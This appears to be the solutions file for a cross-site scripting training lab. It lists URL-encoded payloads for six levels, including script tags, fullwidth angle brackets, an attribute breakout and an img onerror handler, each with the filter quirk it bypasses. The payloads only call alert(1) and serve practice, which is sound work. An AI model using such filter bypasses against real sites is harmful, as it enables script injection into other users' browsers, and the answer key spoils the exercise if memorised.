# unicode — solutions

Unicode normalization / charset / null-byte / backslash quirks in filters.

### unicode-level1

`/unicode/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only fullwidth `＜＞` normalized; ASCII angles pass through

### unicode-level2

`/unicode/level2/?query=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E`

- payload: `＜script＞alert(1)＜/script＞` (fullwidth angles)
- context: ASCII angles stripped first, fullwidth then normalized to `<` `>`

### unicode-level3

`/unicode/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: only null bytes stripped; full HTML passes

### unicode-level4

`/unicode/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: charset=utf-7 is ignored by modern browsers and the reflection is raw

### unicode-level5

`/unicode/level5/?query=%22%20onmouseover=alert(1)%20x=%22`

- payload: `" onmouseover=alert(1) x="`
- context: reflected raw inside `<div title="...">` — attribute breakout

### unicode-level6

`/unicode/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: only backslashes stripped; angles/quotes pass
